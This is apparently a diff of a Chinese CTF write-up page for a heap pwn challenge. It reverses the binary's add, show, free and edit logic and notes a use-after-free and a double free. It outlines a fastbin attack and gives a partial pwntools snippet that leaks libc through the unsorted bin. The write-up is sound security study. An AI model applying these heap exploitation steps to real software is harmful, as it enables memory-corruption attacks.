@@ -228,27 +228,59 @@
 
 <h1><span id="overview">overview</span></h1><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%888.39.03.png" alt="截屏2022-04-07 下午8.39.03"></p>
 <p>​            可以改表</p>
-<h1><span id="re">re</span></h1><p>​        这个题其实感觉不太好逆，有些操作挺乱的，所以以动调为主会比较好。</p>
+<h1><span id="re">re</span></h1><p>​        这个题如果只看ida的话其实感觉挺乱的，所以以动调为主会比较好。在理清了程序运行的一些逻辑后再反过来看伪代码会清晰很多。</p>
 <h2><span id="add">add</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head_ptr = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br></pre></td></tr></table></figure>
 
-<p>如果先申请一个0x28大小的chunk。</p>
-<p>那么首先创建一个结构体chunk，size为0x18。<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%889.27.40.png" alt="截屏2022-04-07 下午9.27.40"></p>
-<p>在010-014储存了size，014-018则为0 。</p>
-<p>这个结构体字段猜测如下：</p>
+<p>​        如果先申请一个0x28大小的chunk。</p>
+<p>​        那么首先创建一个结构体chunk，size为0x18。</p>
+<p>​        这个结构体大致长这样：</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%889.27.40.png" alt="截屏2022-04-07 下午9.27.40"></p>
+<p>​        在010-014储存了size，014-018则为0 。</p>
+<p>​        这个结构体字段猜测如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">size（高四位） <span class="number">0</span>（低四位）</span><br><span class="line">content ptr</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
 
+<p>​    ida中的伪代码对应为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(chunk_ptr, s2, (<span class="keyword">int</span>)(size + <span class="number">1</span>));</span><br><span class="line">struct_ptr[<span class="number">1</span>] = size;</span><br><span class="line">*((_QWORD *)struct_ptr + <span class="number">1</span>) = chunk_ptr;</span><br><span class="line">*((_QWORD *)struct_ptr + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
 
 
-<p>如果申请了同样内容的chunk，只会为新的chunk创建结构体，结构体内保存指向上一个相同chunk的content的ptr。</p>
+
+<p>​        如果申请了同样内容的chunk，只会为新的chunk创建结构体，结构体内保存指向上一个相同chunk的content的ptr。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-07%20%E4%B8%8B%E5%8D%8810.33.52.png" alt="截屏2022-04-07 下午10.33.52"></p>
-<p>因此如果只要连续free两个内容相同的chunk就会造成double free。</p>
-<h3><span id="free">free</span></h3><p>​        有uaf。</p>
-<h2><span id="利用">利用</span></h2><h3><span id="整体思路">整体思路</span></h3><p>​        大概思路还是比较常规的fastbin attack，但是需要构造fake chunk的size合法。</p>
-<p>​        利用fake chunk劫持这个<code>begin_ptr</code>，可以leak heap，同时也可以使用比较常规的unsorted bin leak 来leak libc。</p>
-<p>​        劫持ptr后，将ptr改为free got addr，以修改其为<code>system</code>或者其他什么东西。</p>
-<p>​        所以关键就是分配fake chunk至<code>begin_ptr</code>附近。</p>
-<p>​        因为程序有edit功能，所以改free chunk的fd其实是很简单的，唯一需要考虑的就是fake chunk的size合法性，需要手工构造。</p>
-<h3><span id="劫持fastbin-fd">劫持fastbin fd</span></h3><p>​</p>
+<p>​        因此如果只要连续free两个内容相同的chunk就会造成double free。</p>
+<p>​        创建相同内容时，chunk的结构体内存分布为下图：</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.07.46.png" alt="截屏2022-04-09 上午9.07.46"></p>
+<p>​        可以看到，布局与最开始创建的结构体类似。head+16储存的字段都指向对应的相同内容的chunk的content。</p>
+<p>​        此外，还注意到程序在bss段上添加了两个全局变量。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.12.34.png" alt="截屏2022-04-09 上午9.12.34"></p>
+<p>​        当我们随便申请一些chunk，然后查看该变量的值，会发现它们指向的分别是处于最低地址的chunk的size/idx和处于最高位置的chunk的size/idx位。</p>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-09%20%E4%B8%8A%E5%8D%889.13.10.png" alt="截屏2022-04-09 上午9.13.10"></p>
+<p>​        对应end/start ptr的初始化操作的ida伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(chunk_ptr, s2, (<span class="keyword">int</span>)(size + <span class="number">1</span>));</span><br><span class="line">     struct_ptr[<span class="number">1</span>] = size;</span><br><span class="line">     *((_QWORD *)struct_ptr + <span class="number">1</span>) = chunk_ptr;</span><br><span class="line">     *((_QWORD *)struct_ptr + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">     <span class="keyword">if</span> ( start_ptr )<span class="comment">//第一次addchunk时，还没有start_ptr，于是将其赋值为结构体ptr</span></span><br><span class="line">     &#123;</span><br><span class="line">       *struct_ptr = *(_DWORD *)v3 + <span class="number">1</span>;</span><br><span class="line">       *(_QWORD *)(v3 + <span class="number">16</span>) = struct_ptr;</span><br><span class="line">     &#125;</span><br><span class="line">  		<span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       *struct_ptr = <span class="number">0</span>;</span><br><span class="line">       start_ptr = (__int64)struct_ptr;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     end_ptr = (__int64)struct_ptr;<span class="comment">//首先在第一次add时，将end_ptr赋值为结构体ptr</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>​        也就是当我们只申请了一个chunk时，start和end同时指向结构体chunk的ptr，也就是这个chunk的content域，也就是size/idx字段。</p>
+<h2><span id="show">show</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Info index: &quot;</span>);</span><br><span class="line">idx = read_num();</span><br><span class="line"><span class="keyword">for</span> ( i = start_ptr; i; i = *(i + <span class="number">16</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( idx == *i )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(*(i + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        看起来问题不大。</p>
+<h2><span id="free">free</span></h2><p>​        有uaf。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*(ptr + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>
+
+<p>​        先后free了end ptr和start ptr，但是没有置0。</p>
+<h2><span id="edit">edit</span></h2><p>​        有点类似show的逻辑。首先会比较输入的data的size与chunk本身的size，如果是小于等于的就memcopy过去，但是会多copy一个空字节，可能是作为截断。</p>
+<p>​        如果size比原本chunk大的话，就另外add一个size+1大小的chunk，并将内容copy，然后将原本的chunk的content指针改为新的chunk content，size也一并更改。这个操作就很逆天，总感觉哪里不太对。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str_size = read_str(src, <span class="number">256</span>);</span><br><span class="line"><span class="keyword">if</span> ( str_size &lt;= *(i + <span class="number">4</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span>(*(i + <span class="number">8</span>), src, str_size + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  dest = <span class="built_in">malloc</span>(str_size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, src, str_size + <span class="number">1</span>);</span><br><span class="line">  *(i + <span class="number">8</span>) = dest;</span><br><span class="line">  *(i + <span class="number">4</span>) = str_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1><span id="利用">利用</span></h1><h3><span id="整体思路">整体思路</span></h3><p>​        程序的关键就是如果两个chunk内容相同，可以操作第二个chunk来控制第一个chunk。比如我们可以借此来leak，edit chunk fd等。</p>
+<h3><span id="leak-unsorted-bin">leak unsorted bin</span></h3><p>​            基于程序逻辑，我们add两个chunk，free掉chunk0，使其进入unsorted bin，虽然我们不能直接<code>show(0)</code>，但因为chunk1的content此时是指向chunk 0 content的，所以可以show 1来leak。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64( data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">88</span> - <span class="number">0x10</span></span><br></pre></td></tr></table></figure>
+
+<h3><span id="劫持fastbin-fd">劫持fastbin fd</span></h3><p>​        </p>
+<p>​    </p>
+<p>​        </p>
+<p>​</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
